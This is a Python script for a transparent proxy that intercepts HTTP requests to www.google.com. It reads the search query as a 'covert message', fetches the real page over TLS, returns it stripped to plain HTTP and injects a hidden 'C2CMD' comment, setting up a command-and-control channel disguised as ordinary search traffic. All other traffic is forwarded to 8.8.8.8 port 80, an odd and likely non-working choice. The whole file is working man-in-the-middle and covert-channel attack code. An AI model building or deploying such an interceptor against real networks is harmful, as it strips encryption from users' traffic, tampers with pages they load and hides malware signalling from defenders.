import socket
import threading
import ssl
import re
import urllib.parse

# Listen on internal network
INTERNAL_IP = "0.0.0.0"
INTERNAL_PORT = 80

# Target for interception
TARGET_HOST = "www.google.com"

def inject_command(content, command):
    """
    Insert a covert command into the HTML body as a hidden comment.
    """
    try:
        html = content.decode(errors="ignore")
        injection = f"<!-- C2CMD:{command} -->"
        if "</body>" in html:
            html = html.replace("</body>", injection + "</body>")
        else:
            html += injection
        return html.encode()
    except Exception:
        return content



def fetch_tls(host, path):
    """
    Perform a HTTPS GET request manually using sockets and SSL.
    Returns raw HTTP response (headers + body).
    """
    context = ssl.create_default_context()
    with socket.create_connection((host, 443)) as raw_sock:
        with context.wrap_socket(raw_sock, server_hostname=host) as tls_sock:
            req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            tls_sock.sendall(req.encode())
            response = b""
            while True:
                data = tls_sock.recv(4096)
                if not data:
                    break
                response += data
    return response

def handle_client(client_socket):
    """
    Handle a single client connection, inspect for Google HTTP requests,
    perform TLS stripping, inject covert commands, and forward other traffic.
    """
    try:
        # Read client request
        request = client_socket.recv(4096)
        if not request:
            client_socket.close()
            return

        request_text = request.decode('utf-8', errors='replace')

        # Detect Google HTTP request
        if re.search(rf"Host:\s*{TARGET_HOST}", request_text, re.IGNORECASE):
            print("[+] Intercepted Google HTTP request", flush=True)
            
            # Extract the requested path (/search?q=...)
            first_line = request_text.split('\r\n')[0]
            path = first_line.split(' ')[1] if len(first_line.split(' ')) > 1 else '/'

            # Parse query string to get covert message
            parsed = urllib.parse.urlparse(path)
            covert_message = urllib.parse.parse_qs(parsed.query).get('q', [''])[0]
            print(f"[+] Covert message received: {covert_message}", flush=True)

            # Fetch real page over HTTPS
            raw_response = fetch_tls(TARGET_HOST, path)

            # Separate headers and body
            if b"\r\n\r\n" in raw_response:
                header_bytes, body = raw_response.split(b"\r\n\r\n", 1)
            else:
                header_bytes, body = raw_response, b""

            
            # Inject covert command and check for covert response
            body = inject_command(body, "pong!")

            # Rebuild headers with corrected Content-Length
            header_text = header_bytes.decode(errors="ignore")
            # Remove existing Content-Length to avoid mismatch
            filtered_headers = "\r\n".join(
                h for h in header_text.split("\r\n")
                if not h.lower().startswith("content-length")
            )
            response = (
                f"{filtered_headers}\r\nContent-Length: {len(body)}\r\n\r\n"
            ).encode() + body

            # Send modified page back to client as plain HTTP
            client_socket.sendall(response)
            client_socket.close()
            return

        # Forward all other traffic unchanged (basic transparent proxy)
        print("[+] Forwarding non-Google traffic", flush=True)
        forward_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        forward_socket.connect(("8.8.8.8", 80))
        forward_socket.sendall(request)

        while True:
            chunk = forward_socket.recv(4096)
            if not chunk:
                break
            client_socket.sendall(chunk)
        forward_socket.close()
        client_socket.close()

    except Exception as e:
        print(f"[!] Error in handle_client: {e}", flush=True)
        client_socket.close()

def run_router():
    """
    Start the transparent proxy listening on port 80.
    """
    router = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    router.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    router.bind((INTERNAL_IP, INTERNAL_PORT))
    router.listen(50)
    print(f"[+] Transparent router listening on port {INTERNAL_PORT}", flush=True)

    while True:
        client_sock, addr = router.accept()
        threading.Thread(target=handle_client, args=(client_sock,), daemon=True).start()

if __name__ == "__main__":
    print("[!] RUNNING THE MAIN FUNCTION", flush=True)
    run_router()